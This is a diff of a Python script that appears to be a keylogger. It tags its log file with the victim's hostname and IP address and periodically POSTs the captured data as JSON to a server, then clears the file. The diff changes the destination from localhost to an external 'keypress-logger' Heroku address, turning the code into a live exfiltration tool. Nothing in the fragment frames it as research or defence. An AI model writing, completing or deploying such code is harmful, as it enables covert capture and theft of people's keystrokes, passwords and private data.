@@ -9,7 +9,7 @@ hostname = socket.gethostname()
 ## getting the IP address using socket.gethostbyname() method
 ip_address = socket.gethostbyname(hostname)
 
-url = 'http://localhost:3000/'
+url = 'https://keypress-logger.herokuapp.com/'
 
 file_name=str(hostname)+"_"+str(ip_address)
 f = open(file_name,'w')
@@ -24,7 +24,7 @@ def send_data():
             x=requests.post(url,data=myjson)
             f1.truncate(0)
         except:
-            print("Not connected to server yet!..")    
+            print("Not connected to server yet!..")
     f1.close()
 
 def timer():
